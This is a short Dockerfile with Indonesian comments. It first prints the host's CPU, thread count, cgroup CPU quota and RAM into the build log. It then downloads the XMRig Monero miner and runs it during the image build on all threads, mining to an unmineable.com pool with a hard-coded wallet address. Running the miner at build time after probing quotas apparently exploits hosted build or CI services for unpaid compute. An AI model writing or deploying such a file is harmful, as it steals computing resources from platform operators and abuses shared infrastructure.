FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Step 1: Cek CPU & RAM (Langsung selesai dalam 1 detik, outputnya otomatis muncul di Build log)
RUN echo "=== INFO CPU & THREADS ===" && \
    lscpu | grep -E "Model name|Socket|Thread|NUMA|CPU\(s\)|L3" && \
    echo "Total Threads tersedia: $(nproc)" && \
    echo "=== KUOTA CPU CGROUP CONTAINER ===" && \
    (cat /sys/fs/cgroup/cpu.max 2>/dev/null || cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null || echo "Unlimited") && \
    echo "=== INFO RAM ===" && \
    free -h

# Step 2: Lanjut install & jalankan XMRig sesuai jumlah thread asli ($(nproc))
RUN apt-get update && \
    apt-get install -y wget tar ca-certificates && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
    cd xmrig-6.22.2 && \
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.saldocker-$(hostname) -p x --tls --threads=$(nproc)
